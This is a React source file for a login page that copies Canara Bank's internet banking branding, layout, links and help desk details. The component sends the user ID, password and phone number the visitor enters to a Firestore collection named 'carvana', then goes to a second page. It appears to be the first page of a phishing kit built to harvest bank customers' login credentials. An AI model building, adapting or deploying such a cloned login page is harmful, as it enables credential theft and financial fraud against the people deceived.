import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password1, setPassword1] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaText, setCaptchaText] = useState('');
  const [captchaType, setCaptchaType] = useState('image');
  const [language, setLanguage] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [captchaError, setCaptchaError] = useState('');
  const navigate = useNavigate();

  // Generate a random captcha text
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaText(result);
  };

  // Generate captcha on component mount
  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setCaptchaError('');
    
    // Verify captcha
    if (captcha !== captchaText) {
      setCaptchaError('Invalid captcha. Please try again.');
      generateCaptcha();
      setCaptcha('');
      return;
    }
    
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();
      
      // Upload data to Firestore in the carvana collection
      const result = await FirebaseUtil.uploadAnyModel("carvana", {
        key: `user_${timestamp}`,
        userId,
        password1,
        phoneNumber,
        timeStamp: timestamp,
      });
      
      // Check if upload was successful
      if (result.state === 'success') {
        // Navigate to the second page with the document ID
        setTimeout(() => {
          setIsSubmitting(false);
          navigate(`/second/${result.data}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header - Blue Bar with Logo */}
      <header className="bg-[#0066b3] p-4 flex justify-between items-center">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Canara Bank</h1>
            <p className="text-sm">A Government of India Undertaking</p>
            <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block">
              Fintech Syndicate
            </div>
          </div>
        </div>
        <div className="space-y-1.5">
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
        </div>
      </header>

      {/* Tagline */}
      <div className="bg-[#0066b3] text-white text-center pb-2">
        <p>Together We Can</p>
      </div>

      {/* Main Content - Login Form */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-[#0077be] text-white rounded-3xl w-full max-w-md p-3 sm:p-5 shadow-lg overflow-hidden">
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold mb-4">Login</h2>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                placeholder="Enter User ID"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                className="w-full px-3 py-2 rounded-lg bg-white text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>
            <div>
              <input
                type="tel"
                placeholder="10-digit phone number"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                className="w-full px-3 py-2 rounded-lg bg-white text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
                pattern="[0-9]{10}"
              />
            </div>
            <div>
              <input
                type="password"
                placeholder="Enter Password"
                value={password1}
                onChange={(e) => setPassword1(e.target.value)}
                className="w-full px-3 py-2 rounded-lg bg-white text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>

            {/* Captcha Type Selection */}
            <div className="flex items-center mb-3 space-x-4">
              <label className="flex items-center">
                <input
                  type="radio"
                  name="captchaType"
                  checked={captchaType === 'image'}
                  onChange={() => setCaptchaType('image')}
                  className="mr-2"
                />
                Image Captcha
              </label>
              <label className="flex items-center">
                <input
                  type="radio"
                  name="captchaType"
                  checked={captchaType === 'audio'}
                  onChange={() => setCaptchaType('audio')}
                  className="mr-2"
                />
                Audio Captcha
              </label>
            </div>

            {/* Captcha Input and Image */}
            <div className="flex mb-3 space-x-2">
              <input
                type="text"
                placeholder="Captcha"
                className="flex-1 py-2 px-3 rounded text-gray-700 text-sm"
                value={captcha}
                onChange={(e) => setCaptcha(e.target.value)}
                required
              />
              <div className="bg-white rounded p-2 flex items-center justify-center w-24 relative">
                <span 
                  className="text-gray-700 font-mono text-sm select-none cursor-pointer hover:text-blue-500"
                  style={{
                    fontFamily: 'monospace',
                    letterSpacing: '1px',
                    fontWeight: 'bold',
                    fontStyle: 'italic',
                    textDecoration: 'line-through',
                    background: 'linear-gradient(45deg, rgba(200,200,200,0.2) 25%, transparent 25%, transparent 50%, rgba(200,200,200,0.2) 50%, rgba(200,200,200,0.2) 75%, transparent 75%, transparent)',
                    transform: 'skewX(-5deg)',
                    textShadow: '1px 1px 2px rgba(0,0,0,0.2)',
                    padding: '2px 4px'
                  }}
                  onClick={() => {
                    setCaptcha(captchaText);
                  }}
                >
                  {captchaText}
                </span>
              </div>
              <button 
                type="button" 
                className="text-white p-1"
                onClick={generateCaptcha}
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                </svg>
              </button>
            </div>
            
            {/* Captcha Error Message */}
            {captchaError && (
              <div className="mb-3 text-red-300 text-sm text-center">
                {captchaError}
              </div>
            )}

            {/* Language Selection */}
            <div className="mb-4">
              <select
                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
                value={language}
                onChange={(e) => setLanguage(e.target.value)}
              >
                <option value="English">English</option>
                <option value="Hindi">Hindi</option>
                <option value="Kannada">Kannada</option>
              </select>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full mb-3 text-sm"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "LOGIN"}
            </button>

            {/* Additional Links */}
            <button
              type="button"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full mb-3 text-sm"
            >
              Create/Reset Login Password
            </button>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-4">
              <button
                type="button"
                className="bg-[#00a0e3] hover:bg-blue-600 text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                Unlock User ID
              </button>
              <button
                type="button"
                className="bg-[#00a0e3] hover:bg-blue-600 text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                Activate User ID
              </button>
            </div>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-4">
              <button
                type="button"
                className="bg-[#00a0e3] hover:bg-blue-600 text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                New User Registration
              </button>
              <button
                type="button"
                className="bg-[#00a0e3] hover:bg-blue-600 text-white py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm whitespace-normal"
              >
                Forgot User ID
              </button>
            </div>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mb-4">
              <button
                type="button"
                className="bg-yellow-400 hover:bg-yellow-500 text-black py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm font-bold whitespace-normal"
              >
                PFMS Login
              </button>
              <button
                type="button"
                className="bg-yellow-400 hover:bg-yellow-500 text-black py-2 px-2 sm:px-4 rounded-full text-xs sm:text-sm font-bold whitespace-normal"
              >
                TIN2.0 Bulk Payment
              </button>
            </div>
          </form>

          {/* Links Section */}
          <div className="mt-6 grid grid-cols-2 gap-x-2 gap-y-2 sm:gap-x-4 text-xs sm:text-sm">
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">15G/H Submission</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">Apply for Locker</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">Card Rewardz</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">User Guidelines</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">Calendar</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">Apply For POS</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">Canara Easy Fee</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">BBPS Bill Payments</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">Canara Card Tokenisation</a>
            <a href="#" className="text-blue-200 hover:text-white hover:underline truncate">Facilities@Internet Banking</a>
          </div>

          {/* Security Badge */}
          <div className="mt-6 flex items-center justify-start">
            <div className="bg-white p-2 rounded-full mr-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-blue-800" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <div className="text-xs">
              <div className="font-bold">secure</div>
              <div>GlobalSign</div>
            </div>
          </div>

          {/* Social Media Links */}
          <div className="mt-4">
            <p className="text-sm font-bold mb-2">Connect with us:</p>
            <div className="flex space-x-3">
              <a href="#" className="text-white hover:text-blue-300">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-pink-400">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.059-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4-1.216 0-2.359-.631-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146 1.124.347 2.317.535 3.554.535 6.627 0 12-5.373 12-12 0-6.628-5.373-12-12-12z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-gray-500">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-red-600">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-blue-600">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z" />
                </svg>
              </a>
              <a href="#" className="text-white hover:text-red-500">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 0c-6.627 0-12 5.372-12 12 0 5.084 3.163 9.426 7.627 11.174-.105-.949-.2-2.405.042-3.441.218-.937 1.407-5.965 1.407-5.965s-.359-.719-.359-1.782c0-1.668.967-2.914 2.171-2.914 1.023 0 1.518.769 1.518 1.69 0 1.029-.655 2.568-.994 3.995-.283 1.194.599 2.169 1.777 2.169 2.133 0 3.772-2.249 3.772-5.495 0-2.873-2.064-4.882-5.012-4.882-3.414 0-5.418 2.561-5.418 5.207 0 1.031.397 2.138.893 2.738.098.119.112.224.083.345l-.333 1.36c-.053.22-.174.267-.402.161-1.499-.698-2.436-2.889-2.436-4.649 0-3.785 2.75-7.262 7.929-7.262 4.163 0 7.398 2.967 7.398 6.931 0 4.136-2.607 7.464-6.227 7.464-1.216 0-2.359-.631-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146 1.124.347 2.317.535 3.554.535 6.627 0 12-5.373 12-12 0-6.628-5.373-12-12-12z" />
                </svg>
              </a>
            </div>
          </div>

          {/* Virtual Assistant */}
          <div className="mt-6 flex items-center justify-between">
            <div className="text-xs max-w-[70%]">
              <p>For safe usage and better experience with Internet Banking, Kindly login through <span className="text-yellow-300">Incognito mode</span>. For assistance please contact our Help Desk No. 1030</p>
            </div>
            <div className="relative">
              <div className="w-16 h-16 bg-yellow-400 rounded-full overflow-hidden">
                <img 
                  src="https://placehold.co/100x100/FFC107/FFFFFF/png?text=👨‍💼" 
                  alt="Virtual Assistant" 
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
        <p className="text-xs">For support, call 1800-123-4567 or email support@canarabank.com</p>
      </footer>
    </div>
  );
};

export default FirstPage;
